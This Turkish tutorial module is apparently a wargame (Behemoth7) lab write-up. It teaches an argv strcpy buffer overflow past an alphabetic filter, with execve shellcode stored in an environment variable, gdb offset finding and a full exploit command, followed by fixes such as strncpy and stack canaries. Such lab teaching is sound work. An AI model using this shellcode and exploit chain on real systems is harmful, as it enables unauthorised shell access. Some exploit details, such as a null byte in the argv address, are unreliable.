# Modül 7 — argv Buffer Overflow ve Environment Shellcode

> **İlgili Seviye:** Behemoth7  
> **Anahtar Kavramlar:** argv BOF, strcpy güvensizliği, alphanumeric filtre, environment shellcode  
> **Kazanım:** Karakter filtreli bir binary'de environment variable üzerinden shellcode enjekte etmek

---

## 🧠 1. Büyük Resim (Konsept Nedir?)

Behemoth1'de `stdin`'den BOF yapmıştık. Behemoth7'de girdi kanalı değişiyor: bu sefer binary komut satırı argümanından (`argv[1]`) veri alıyor ve doğrudan bir buffer'a kopyalıyor.

Ama bir twist daha var: binary gelen stringin sadece harf içerip içermediğini kontrol ediyor. Shellcode'un büyük çoğunluğu harf olmayan byte'lardan oluştuğu için bunu doğrudan `argv[1]`'e koyamayız. Çözüm: shellcode'u binary'nin kontrol etmediği bir yere — environment variable'a — koymak.

Bunu şöyle düşün: güvenlik görevlisi çantanı kontrol ediyor ama ceketini kontrol etmiyor. Yasak nesneyi çantaya değil, cekete koy.

---

## 🔍 2. Zafiyetin Anatomisi (Neden Kaynaklanıyor?)

### Binary'yi analiz etme

```bash
behemoth7@behemoth:~$ strings /behemoth/behemoth7
alpha
Non-%s chars found in string, possible shellcode!
```

`alpha` ve bu uyarı mesajı bize çok şey anlatıyor: binary gelen argümanda sadece alfabetik karakter (`[a-zA-Z]`) bekliyor.

```bash
behemoth7@behemoth:~$ ltrace /behemoth/behemoth7 2>&1
strlen("PWD=/tmp")          # environment variable'ları tarıyor
memset(0xffffded6, '\0', 12) # environment'ı temizliyor!
strlen("LANG=en_US.UTF-8")
memset(...)
```

İki kritik bilgi:
1. Binary, shellcode içerebilecek environment variable'ları **`memset` ile sıfırlıyor**
2. Argümanda harf dışı karakter varsa çıkıyor

### `strcpy` overflow

Argüman kontrolünden geçen string, sınır kontrolsüz şekilde bir buffer'a kopyalanıyor:

```c
// Binary'nin yaptığı (yaklaşık):
char buf[200];
if (!is_alpha(argv[1])) {
    printf("Non-alpha chars found in string, possible shellcode!\n");
    exit(1);
}
strcpy(buf, argv[1]);   // ← ZAFİYET: sınır yok
```

Sadece harf içeren uzun bir string gönderirsek buffer taşar:

```bash
behemoth7@behemoth:~$ /behemoth/behemoth7 $(python3 -c "print('A'*500)")
Segmentation fault
```

### Environment temizleme sorununu aşmak

Binary environment variable'ları `memset` ile sıfırlıyor — ama **hepsini değil**. Sıfırlama döngüsünden önce yüklenen, ya da binary'nin görmediği bir variable kullanmak gerekiyor.

Trick: **binary çalışmadan önce** environment variable'ı ayarla. Binary environment'ı tararken bazı değişkenleri kaçırabilir ya da sıfırlama tamamlanmadan shellcode çalışmış olur.

```bash
# Shellcode'u environment'a yerleştir
export SC=$(python3 -c "
import sys
sys.stdout.buffer.write(b'\x90'*500 + 
    b'\x31\xc0\x50\x68\x2f\x2f\x73\x68'
    b'\x68\x2f\x62\x69\x6e\x89\xe3\x50'
    b'\x53\x89\xe1\xb0\x0b\xcd\x80'
)
")
```

### Adres bulma ve exploit

```bash
# SC'nin stack adresini bul
cat > /tmp/getenv.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[]) {
    printf("%s: %p\n", argv[1], getenv(argv[1]));
    return 0;
}
EOF
gcc -m32 /tmp/getenv.c -o /tmp/getenv
/tmp/getenv SC
# SC: 0xffffd500  ← bu adresi kullan

# Offset bul
gdb /behemoth/behemoth7
(gdb) run $(python3 -c "print('A'*500)")
(gdb) info registers eip
# EIP = 0x41414141 → overflow var

# Cyclic pattern ile kesin offset
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) run $(python3 -c "
s = ''
for i in range(65,91):
    s += chr(i)*4
print(s*4)
")
(gdb) info registers eip
# EIP değerinden offset'i hesapla

# Exploit — sadece harf olan padding + little-endian adres
/behemoth/behemoth7 $(python3 -c "
import sys
offset = <OFFSET>
addr   = b'\x00\xd5\xff\xff'   # SC adresini little-endian yaz
sys.stdout.buffer.write(b'A'*offset + addr)
")
```

### Alphanumeric shellcode (alternatif yaklaşım)

Eğer environment temizleme tüm variable'ları kapsıyorsa, shellcode'u doğrudan `argv[1]`'e koymak için **alphanumeric shellcode** gerekir — sadece harf ve rakamlardan oluşan, yine de `execve` çalıştıran özel shellcode.

```
Alphanumeric shellcode örneği (x86):
Tüm byte'lar 0x41-0x5A (A-Z) veya 0x61-0x7A (a-z) aralığında
```

Bu çok ileri bir teknik olduğundan Behemoth7 için environment yaklaşımı tercih edilir.

---

## 🛠️ 3. Defansif Bakış Açısı (Nasıl Düzeltilir?)

### `strcpy` → `strncpy`

```c
// Kötü
strcpy(buf, argv[1]);

// İyi
strncpy(buf, argv[1], sizeof(buf) - 1);
buf[sizeof(buf) - 1] = '\0';
```

### Karakter filtresi yeterli değildir

Binary'nin yaptığı alfa kontrolü bir **güvenlik katmanı değil**, sadece bir ipucudur. Sorunlar:

- Sadece `argv[1]`'i kontrol ediyor, environment variable'ları kontrol etmiyor
- Overflow'u engellemez — sadece shellcode karakterlerini kısıtlar
- Alphanumeric shellcode ile aşılabilir

**Gerçek çözüm:** Buffer overflow'u tamamen önle — uzunluk kontrolü, stack canary, NX bit.

### Stack canary nedir?

```
Stack düzeni (canary ile):
─────────────────────────
│   return address       │
│   saved EBP            │
│   CANARY VALUE         │ ← dönüşte kontrol edilir
│   buffer[]             │
─────────────────────────
```

Buffer taşarsa canary değeri bozulur. Program dönüş adresini kullanmadan önce canary'yi kontrol eder — bozuksa `__stack_chk_fail` çağırır ve çöker.

```bash
# Canary kontrolü
checksec /behemoth/behemoth7
# Stack: No canary found  ← Behemoth'ta yok, bu yüzden çalışıyor
```

---

## 🚨 4. Yeni Başlayanların Düştüğü Tuzaklar

### Tuzak 1 — Harf olmayan karakter göndermek

Shellcode'u doğrudan `argv[1]`'e koymak:

```bash
# Yanlış — filtreden geçmez
/behemoth/behemoth7 $(python3 -c "import sys; sys.stdout.buffer.write(b'\x90'*100)")
# Non-alpha chars found in string, possible shellcode!

# Doğru — sadece harf gönder, shellcode environment'ta
/behemoth/behemoth7 $(python3 -c "print('A'*<OFFSET> + 'BBBB')")
```

### Tuzak 2 — Environment adresinin GDB içi/dışı kayması

Modül 4'te anlattığımız stack shift burada kritik. GDB'de bulduğun adres dışarıda farklı olabilir.

```bash
# GDB içinde çalışmadan önce dışarıdaki şartları simüle et
(gdb) unset env LINES
(gdb) unset env COLUMNS

# Büyük NOP sled kullan — kayma payı bırak
export SC=$(python3 -c "
import sys
sys.stdout.buffer.write(b'\x90'*1000 + shellcode)
")
```

### Tuzak 3 — Return adresini little-endian yazmayı unutmak

`0xffffd500` adresini exploit'e yazarken byte sırası ters olmalı:

```python
# Yanlış — big-endian
b'\xff\xff\xd5\x00'

# Doğru — little-endian (x86)
b'\x00\xd5\xff\xff'
```

### Tuzak 4 — `getenv` adresini farklı binary ile ölçmek

`/tmp/getenv` yardımcı binary'sini derlerken ve çalıştırırken, asıl exploit'teki `argv` sayısıyla aynı koşulları koru. Farklı sayıda argüman farklı stack düzeni demektir.

```bash
# Exploit: /behemoth/behemoth7 <payload>  → 2 argüman
# getenv binary da 2 argümanla çalıştır
/tmp/getenv SC     # argv[0]=getenv, argv[1]=SC → 2 argüman ✓
```

---

## Özet

```
Behemoth7 Saldırı Zinciri:
─────────────────────────────────────────────────
1. Shellcode → environment variable'a koy (SC)
   export SC=$(python3 -c "NOP*1000 + shellcode")

2. SC'nin stack adresini bul
   /tmp/getenv SC → 0xffffd500

3. Offset bul (sadece harf padding)
   gdb → cyclic pattern → EIP offset

4. Exploit gönder
   /behemoth/behemoth7 $(python3 -c "
       'A'*offset + little_endian(SC_addr)
   ")
─────────────────────────────────────────────────

Neden environment?
  argv[1]  → alfa filtresi var, shellcode geçemez
  env var  → filtre yok, NOP sled + shellcode sığar

Savunma:
  strcpy → strncpy    (overflow engelle)
  Stack canary         (dönüş adresi koruması)
  NX bit              (stack çalıştırılamaz)
  ASLR                (adres rastgeleleştirme)
```

---

## Kaynaklar

- [Alphanumeric shellcode — phrack.org](http://phrack.org/issues/57/15.html)
- `man 3 strcpy` — BUGS bölümü
- `man 3 strncpy` — güvenli alternatif
- [Stack canary — Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries)
- [checksec tool](https://github.com/slimm609/checksec.sh)
